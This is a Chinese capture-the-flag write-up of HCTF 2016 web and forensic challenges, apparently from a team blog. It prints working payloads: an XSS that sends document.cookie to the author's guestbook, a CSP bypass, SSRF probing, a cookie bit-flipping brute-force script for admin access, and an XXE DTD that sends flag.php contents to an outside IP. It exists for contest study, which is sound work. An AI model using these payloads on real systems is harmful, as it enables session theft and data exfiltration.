+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>可以跳转页面，估计是绕过csp的一个本域文件</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="55" src="./HCTF2016WebWP – Wupco's Blog/19.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="19.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="72" src="./HCTF2016WebWP – Wupco's Blog/20.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="20.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>通过上传js来实现本地js包含</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="204" src="./HCTF2016WebWP – Wupco's Blog/21.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="21.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>发现有同源检测</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>构造</span></p>
+<pre class="brush:xml;toolbar:false">&lt;script&gt;var xml = new XMLHttpRequest(); 
+xml.open('POST', 'http://sguestbook.hctf.io/submit.php', true); 
+xml.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+ xml.send('to=wupco&amp;message='+document.cookie); &lt;/script&gt;</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>将cookie直接发到自己的留言板上</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="117" src="./HCTF2016WebWP – Wupco's Blog/22.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="22.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>&lt;link rel="import" href="</span><a href="http://sguestbook.hctf.io/upload/e72bdb0e967eb678737a313c821b9609" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://sguestbook.hctf.io/upload/e72bdb0e967eb678737a313c821b9609</span></a><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>"&gt;</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>JS不运行？？控制台并没有显示拦截啊。。。。</span></p>
+<pre class="brush:xml;toolbar:false">"default-src 'self'; 
+script-src http://sguestbook.hctf.io/static/ 
+'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA='
+ 'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg=' 
+ 'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ='
+  'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=' 
+  'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc='
+   'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4='
+    'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I=' 
+   'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ='
+    'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw=';
+    font-src http://sguestbook.hctf.io/static/ fonts.gstatic.com; 
+    style-src 'self' 'unsafe-inline';
+     img-src 'self'"</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>最终PAYLOAD：(发给 admin )</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; color: rgb(255, 0, 0); vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>&lt;scriimgpt src="./static/redirect.php?u=/upload/0f31219c6eddad22026ceff18acb25d3"&gt;</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; color: rgb(255, 0, 0); vertical-align: baseline; white-space: pre-wrap;"><img height="70" src="./HCTF2016WebWP – Wupco's Blog/23.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="23.png" width="431"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="148" src="./HCTF2016WebWP – Wupco's Blog/24.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="24.png" width="602"/></span></p>
+<h3 dir="ltr" style="line-height:1.38;margin-top:16pt;margin-bottom:4pt;"><span style='font-size: 18.6667px; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>at1 |sovled|xiaojunjie</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>SSRF，通过Location跳转读取80端口信息</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://yqxiaojunjie.com/test.php?port=80&amp;t=1.tid" style="text-decoration:none;"><span style="font-size: 14.6667px; font-family: Arial; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap;">http://yqxiaojunjie.com/test.php?port=80&amp;t=1.tid</span></a></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="212" src="./HCTF2016WebWP – Wupco's Blog/25.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="25.png" width="602"/></span></p>
+<h3 dir="ltr" style="line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"><span style='font-weight: 700; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 18px;'>at2|open|working:wupco,xiaojunjie, janes(未解决)</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>hint：</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>1: 在第一题里不只有flag，还有第二题的入口</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>2、你们几百线程扫端口也是没用的呀</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://atfield.hctf.io/" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://atfield.hctf.io</span></a></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>3 我从来没说过，flag1那里没有别的东西啊</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="109" src="./HCTF2016WebWP – Wupco's Blog/26.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="26.png" width="422"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="51" src="./HCTF2016WebWP – Wupco's Blog/27.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="27.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>得到服务器公网IP：120.27.4.96</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>内网端口8000  </span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="282" src="./HCTF2016WebWP – Wupco's Blog/28.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="28.png" width="345"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><br/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>通过魔法禁书目录 phpinfo 获得内网ip格式 192.168.0.x</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>内网ip:192.168.0.11</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><br/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="165" src="./HCTF2016WebWP – Wupco's Blog/29.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="29.png" width="519"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>11.23</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>ak说上线的.git要都删了，以免被拖源码</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>11.24</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>听ak说nosql蛮好用的，link一个玩玩看</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>11.25</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>哎呀,docker怎么没有crontab,都不能定时重启，装一个装一个</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><br/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>crontab 后门 </span><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><a href="http://www.secbox.cn/hacker/web/3629.html" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://www.secbox.cn/hacker/web/3629.html</a></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>docker应该是link了一个redis或者memcached, 然后写crontab。。。</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>redis: 6379</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>memcached: 11211</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="236" src="./HCTF2016WebWP – Wupco's Blog/30.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="30.png" width="542"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><br/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>192.168.1.10 开启了redis</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>可能会用到Python 的HTTP头注入。</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><br/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; text-decoration: line-through; vertical-align: baseline; white-space: pre-wrap;"><img height="192" src="./HCTF2016WebWP – Wupco's Blog/31.jpg" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="31.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; text-decoration: line-through; vertical-align: baseline; white-space: pre-wrap;"><img height="92" src="./HCTF2016WebWP – Wupco's Blog/32.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="32.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; text-decoration: line-through; vertical-align: baseline; white-space: pre-wrap;"><img height="156" src="./HCTF2016WebWP – Wupco's Blog/33.jpg" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="33.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="https://virusdefender.net/index.php/archives/749/" style='text-decoration: underline; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-family: 微软雅黑, "Microsoft YaHei";'><span style="font-size: 14.6667px; font-family: Arial; color: rgb(17, 85, 204); text-decoration: underline line-through; vertical-align: baseline; white-space: pre-wrap;">ht</span><span style="font-size: 14.6667px; font-family: Arial; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap;">tps://virusdefender.net/index.php/archives/749/</span></span></a><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'> </span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"></p>
+<h3 dir="ltr" style="line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap; font-size: 18px;">图书馆2 |solved|xiaojunjie</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>1.txt由</span></p>
+<pre class="brush:php;toolbar:false">&lt;?php
+function encrypt($string) {
+  $密钥 = "23333";
+    $algorithm = 'rijndael-128';
+    $key = md5($密钥, true);
+    $iv_length = mcrypt_get_iv_size( $algorithm, MCRYPT_MODE_CBC );
+    $iv = mcrypt_create_iv( $iv_length, MCRYPT_RAND );
+    $encrypted = mcrypt_encrypt( $algorithm, $key, $string, MCRYPT_MODE_CBC, $iv );
+    $result = urlsafe_b64encode( $iv . $encrypted );
+    return $result;
+}
+function decrypt( $string ) {
+$密钥 = "23333";
+    $algorithm =  'rijndael-128';
+    $key = md5($密钥, true );
+    $iv_length = mcrypt_get_iv_size( $algorithm, MCRYPT_MODE_CBC );
+    $string = urlsafe_b64decode( $string );
+    $iv = substr( $string, 0, $iv_length );
+    $encrypted = substr( $string, $iv_length );
+    $result = mcrypt_decrypt( $algorithm, $key, $encrypted, MCRYPT_MODE_CBC, $iv );    
+    $result = rtrim($result, "\0");    
+    return $result;
+}
+function urlsafe_b64encode($string) {
+   $data = base64_encode($string);
+   $data = str_replace(array('+','/','='),array('-','_',''),$data);
+   return $data;
+}
+function urlsafe_b64decode($string) {
+   $data = str_replace(array('-','_'),array('+','/'),$string);
+   $mod4 = strlen($data) % 4;
+   if ($mod4) {
+   $data .= substr('====', $mod4);
+   }
+   return base64_decode($data);
+}
+$string=$_GET[cmd];
+// echo "decode: ".str_replace(array('-','_'),array('+','/'),$string)."&lt;br&gt;";
+// echo "encode: ".str_replace(array('+','/','='),array('-','_',''),$string);
+$data="";
+for ($i=1;$i&lt;256;$i++){
+$string=base64_encode("\x82\x1E\x32\xDE\x2F".pack("C",$i)."\x74\x01\xF2\x6B\xF6\xFB
+\x50\x9C\x69\x79\x66\xEE\x82\x37\xC6\xB1\xB0\xD6\x90\x50\x1F\x85\xCA\x19\x12\x21");
+#echo bin2hex("\x82\x1E\x32\xDE\x2F".pack("C",$i)."\x74\x01\xF2\x6B\xF6\xFB\x50\x9C
+\x69\x79\x66\xEE\x82\x37\xC6\xB1\xB0\xD6\x90\x50\x1F\x85\xCA\x19\x12\x21");
+    
+$data.=str_replace(array('+','/','='),array('-','_',''),$string);
+echo $data;
+$data.="\n";
+ }</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>file_put_contents("1.txt",$data);</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>生成 然后跑脚本    </span></p>
+<pre class="brush:python;toolbar:false">import requests
+import re
+s=requests.Session()
+f_in=open("1.txt")
+test=[]
+for line in f_in.readlines():
+cookie=line.strip("\n")
+header={"Cookie":"username={0}".format(cookie)}
+url="http://index-librorum-prohibitorum.hctf.io/login.php"
+res=s.get(url,headers=header)
+try :
+    data=re.findall("Prohibitorum (.*)&lt;/td",res.content)[0]
+    print data
+    if data=='admin':
+        print cookie
+        exit()
+except:
+    print cookie</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>脚本对比没写好   意思就是注册一个admin.用户 然后跑一遍 让最后一位变成\00就可以了</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>admin cookie :gh4y3i9ddAHya_b7UJxpeWbugjfGsbDWkFAfhcoZEiE</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>擦 好像还不对..</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>日 我思路错了</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>应该是admi3 然后改成admin</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>字符大于5 ..</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>gh4y3i9ddAHya_b7UJxpeWbugjfGsbDWkFAfhcoZEiE</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>这个才是对的</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="63" src="./HCTF2016WebWP – Wupco's Blog/34.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="34.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>1.dtd</span></p>
+<pre class="brush:xml;toolbar:false">&lt;!ENTITY % all
+"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://107.182.177.34:23333/?data=%file;'&gt;"
+&gt;
+%all;
+xml
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=
+    /var/www/html/flag.php"&gt;
+    &lt;!ENTITY % dtd SYSTEM "http://107.182.177.34:23333/1.dtd"&gt;
+%dtd;
+%send;
+]&gt;</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>发现fp做完留下来的zip  然后顺便去他服务器上看了下dtd。。。 改一下ip 你懂的 =.=</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>hctf{Lillie_is_comming} </span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'></span></p>
+<h2 dir="ltr" style="line-height:1.38;margin-top:18pt;margin-bottom:4pt;"><span style='font-family: 微软雅黑, "Microsoft YaHei";'><span style="font-size: 26.6667px; vertical-align: baseline; white-space: pre-wrap;">Forensic </span><span style="font-size: 14.6667px; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">链接：</span></span><a href="http://pan.baidu.com/s/1bpaHTs7" style='font-size: 14.6667px; color: rgb(17, 85, 204); font-weight: 400; text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); font-weight: 400; text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://pan.baidu.com/s/1bpaHTs7</span></a><span style='font-size: 14.6667px; font-weight: 400; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'> 密码：lzup</span></h2>
+<h3 dir="ltr" style="line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"><span style='font-weight: 700; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>web选手的自我修养  | solved | working: janes,wupco</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>导入tar包到本地docker镜像</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>`docker load &lt; /tmp/new-image.tar `</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://www.freebuf.com/articles/105793.html" style='text-decoration: underline; font-size: 14.6667px; color: rgb(0, 0, 0); vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(0, 0, 0); vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://www.freebuf.com/articles/105793.html</span></a><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'> 利用PHP 7中的OPcache来实现Webshell</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://gosecure.net/2016/04/27/binary-webshell-through-opcache-in-php-7/" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://gosecure.net/2016/04/27/binary-webshell-through-opcache-in-php-7/</span></a></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>因为是取证，所以按时间排序一下bin文件，找到最后修改的 ，即可</span></p>
